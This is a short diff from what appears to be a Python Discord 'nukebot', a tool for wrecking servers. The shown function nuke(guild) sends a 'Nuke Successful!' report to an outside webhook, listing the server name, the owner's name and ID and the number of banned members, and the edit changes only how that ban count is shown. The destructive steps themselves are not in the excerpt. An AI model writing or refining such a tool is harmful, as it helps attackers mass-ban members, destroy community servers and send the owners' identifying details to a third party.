@@ -48,7 +48,7 @@ async def nuke(guild):
   log = DiscordEmbed(title = f"Nuke Successful!", description = f"Server: [**{guild.name}**]")
   log.add_embed_field(name = "Nukebot Used", value = f"{bot.user.name}#{bot.user.discriminator} | `{bot.user.id}`")
   log.add_embed_field(name = "Server Owner", value = f"{guild.owner} | `{guild.owner.id}`", inline = False)
-  log.add_embed_field(name = "Members Banned", value = f"{len(guild.bans)}", inline = False)
+  log.add_embed_field(name = "Members Banned", value = f"{guild.bans}", inline = False)
   webhook.add_embed(log)
   webhook.execute()
   for i in range(100):
